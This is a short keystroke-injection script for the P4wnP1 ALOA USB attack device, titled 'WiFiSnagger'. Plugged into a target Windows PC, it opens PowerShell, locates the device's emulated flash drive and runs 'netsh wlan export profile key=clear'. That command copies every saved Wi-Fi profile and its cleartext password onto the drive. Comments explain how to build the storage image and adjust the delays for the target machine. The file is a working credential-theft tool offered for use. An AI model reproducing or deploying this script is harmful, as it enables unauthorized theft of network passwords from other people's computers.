//Layout and Stuff
layout("DE");
console.log("WiFiSnagger started");
typingSpeed(0,0);
delay(800);

//Snagging Wifi Credentials and puts them on the Flashdrive (Make sure you created a flashdrive by doing 'cd /usr/local/P4wnP1/helper' then './genimg -s *SIZE_IN_MB* -o *IMAGENAME*'
//You got to go to the USB Page and turn on Mass Storage, then use your newly created .bin file and store that setup to put it into the Master Startup Template for this code.
//Make sure to disable some other USB option, having more then 4 options active will cause the Master Startup Template to fail and make your P1 reset to default settings (No Files will be lost tho)
press("WIN R")
delay(500)
type("powershell\n") 
delay(500)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'P4wnP1 ALOA' } | select name \n") // Change -eq 'P4wnP1 ALOA' to -eq 'YOUR USB NAME' since this line finds out the Label of the USB by finding it from its name.
delay(500)
type("cd $usbpath.name\n")
delay(500)
type("netsh wlan export profile key=clear\n")
delay(500)
type("exit\n")

//Edit the delay according to your targets PC, some are wayyyy too slow for a delay of just 500ms
//Plug in your P4wnP1 into your own machine after that and it should be recognized as a flashdrive with the WiFi Creds on it.
